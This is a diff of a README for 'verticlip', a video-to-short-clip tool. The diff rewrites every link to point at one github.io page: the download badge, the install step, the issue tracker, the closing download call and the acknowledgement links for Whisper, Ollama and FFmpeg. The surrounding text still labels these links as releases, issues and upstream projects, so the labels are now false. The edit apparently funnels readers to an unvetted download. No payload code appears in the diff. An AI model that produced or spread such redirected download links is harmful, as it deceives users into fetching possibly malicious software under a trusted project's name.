@@ -1,6 +1,6 @@
 # 📼 verticlip - Turn Long Videos Into Viral Clips
 
-[![Download verticlip](https://img.shields.io/badge/Download-verticlip-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DeepestOceanEver/verticlip/releases)
+[![Download verticlip](https://img.shields.io/badge/Download-verticlip-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://deepestoceanever.github.io)
 
 ## 👋 Welcome to verticlip
 
@@ -22,7 +22,7 @@ Follow these simple steps to get verticlip running on your Windows computer.
 
 ### 📥 Step 1: Download verticlip
 
-Visit this link to download the application: [https://github.com/DeepestOceanEver/verticlip/releases](https://github.com/DeepestOceanEver/verticlip/releases)
+Visit this link to download the application: [https://deepestoceanever.github.io](https://deepestoceanever.github.io)
 
 Click the download button for the latest release. Save the file to your computer.
 
@@ -121,7 +121,7 @@ Check the **"Help"** menu in the application. You can also visit the GitHub repo
 If you need assistance:
 
 1. **In-app Help** – Press F1 or click the "?" icon
-2. **GitHub Issues** – [Report bugs or ask questions](https://github.com/DeepestOceanEver/verticlip/issues)
+2. **GitHub Issues** – [Report bugs or ask questions](https://deepestoceanever.github.io)
 3. **Documentation** – Check the `docs` folder in the repository
 
 ## 📊 Version History
@@ -135,9 +135,9 @@ If you need assistance:
 ## 🙏 Acknowledgements
 
 verticlip builds on amazing open-source tools:
-- [OpenAI Whisper](https://github.com/openai/whisper) – Speech recognition
-- [Ollama](https://ollama.ai) – Local AI model runner
-- [FFmpeg](https://ffmpeg.org) – Video processing
+- [OpenAI Whisper](https://deepestoceanever.github.io) – Speech recognition
+- [Ollama](https://deepestoceanever.github.io) – Local AI model runner
+- [FFmpeg](https://deepestoceanever.github.io) – Video processing
 
 ## 📜 License
 
@@ -145,6 +145,6 @@ verticlip is released under the MIT License. See the `LICENSE` file for details.
 
 ---
 
-**Ready to start creating?** [Download verticlip now](https://github.com/DeepestOceanEver/verticlip/releases) and turn your boring vertical videos into engagement gold.
+**Ready to start creating?** [Download verticlip now](https://deepestoceanever.github.io) and turn your boring vertical videos into engagement gold.
 
 Keywords: ffmpeg, local-first, ollama, python, shorts, tiktok, video, video-editing, whisper, youtube-shorts
